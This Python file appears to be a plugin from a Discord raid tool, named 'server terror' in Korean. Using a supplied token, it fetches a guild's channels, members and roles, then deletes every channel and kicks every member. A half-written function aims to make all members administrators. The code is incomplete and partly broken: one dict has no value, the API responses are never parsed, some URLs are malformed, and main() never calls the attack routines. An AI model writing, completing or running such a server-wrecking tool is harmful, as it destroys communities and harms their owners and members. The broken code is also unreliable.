import importlib
from typing import Any

from colorama import Fore
import requests
    
from utils.Plugin.PluginABC import PluginABC
from utils.Setting.setup_most import TokenValidator, heads


class GuildBomber(PluginABC):
    plugin_name = "서버 테러"
    
    @classmethod
    def return_channels(cls, token: str, guild_id: str):
        url = f"https://discord.com/api/v10/guilds/{guild_id}/channels"
        channels: list[dict[Any, Any]] = requests.get(url=url, headers=heads(token))
        return channels
    
    @classmethod
    def return_members(cls, token: str, guild_id: str):
        url = f"https://discord.com/api/v10/guilds/{guild_id}/members"
        members: list[dict[Any, Any]] = requests.get(url=url, headers=heads(token))
        return members
    
    @classmethod
    def return_roles(cls, token: str, guild_id: str):
        url = f"https://discord.com/api/v10/guilds/{guild_id}/roles"
        roles: list[dict[Any, Any]] = requests.get(url=url, headers=heads(token))
        return roles
    
    @classmethod
    def delete_all_guild_channels(cls, token: str, channels: list[dict[Any, Any]]):
        for channel in channels:
            try:
                url = f"https://discord.com/api/v10/channels/{channel['id']}"
                requests.delete(url=url, headers=heads(token))
                print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] 삭제된 채널: {Fore.WHITE}{channel['id']}{Fore.RESET}")
            except Exception as e:
                print(f"\n\n오류! : {e}")
                
    @classmethod
    def remove_all_guild_members(cls, token: str, guild_id: str, members: list[dict[Any, Any]]):
        for member in members:
            try:
                url = f"https://discord.com/api/v10/channels/guilds/{guild_id}/members/{member['user']['id']}"
                requests.delete(url=url, headers=heads(token))
                print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] 삭제된 멤버: {Fore.WHITE}{member['user']['id']}{Fore.RESET}")
            except Exception as e:
                print(f"\n\n오류! : {e}")
                
    @classmethod
    def make_all_members_administrator(cls, token: str, guild_id: str):
        url = f"https://discord.com/api/v10/channels/guilds/{guild_id}/roles/{guild_id}"
        data = {
           "permissions": 
        }
        
        
            
    @classmethod
    async def main(cls):
        option = super().get_option()
        
        if option == 1:
            token = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] 토큰: ')
            await TokenValidator(token)
            
            input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] 엔터를 눌러주세요: ')
            await importlib.import_module("main").Hydron()
            
        else:
            await importlib.import_module("main").Hydron()